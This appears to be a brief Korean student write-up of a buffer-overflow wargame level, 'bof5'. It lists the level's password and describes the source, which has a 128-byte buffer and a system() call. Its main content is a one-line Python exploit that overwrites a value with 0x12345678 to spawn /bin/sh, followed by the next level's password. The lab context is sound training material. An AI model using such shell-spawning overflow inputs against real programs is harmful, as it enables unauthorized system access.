# bof5

## bof5 ID : bof5
## bof5 password : c75cfe84

<과정>
1. ls를 통해 bof5 bof5.c bof5.hint bof6pw가 있음을 알 수 있음(bof6권한 x)
2. (bat bof5.c) bof5.c 소스코드
* buf크기 : 128
* system(buf);
  * system 함수 --> 쉘 실행 

<img src="https://github.com/adakim3297/day3/blob/main/bof5%20%EC%86%8C%EC%8A%A4%EC%BD%94%EB%93%9C.png?raw=true" width="350" height="450"/>

4. bof5 힌트
* 
  <img src = "https://github.com/adakim3297/day3/blob/main/bof5.hint.png?raw=true" width="500" height="110"/> 

*  (python -c "print '/bin/sh\x00' + 'x'*132 +'\x78\x56\x34\x12'" ;cat) | ./bof5

<결과>
<img src = "https://github.com/adakim3297/day3/blob/main/bof6.password.png?raw=true" width ="250" height = "90"/>
* bof6 password : b35aad61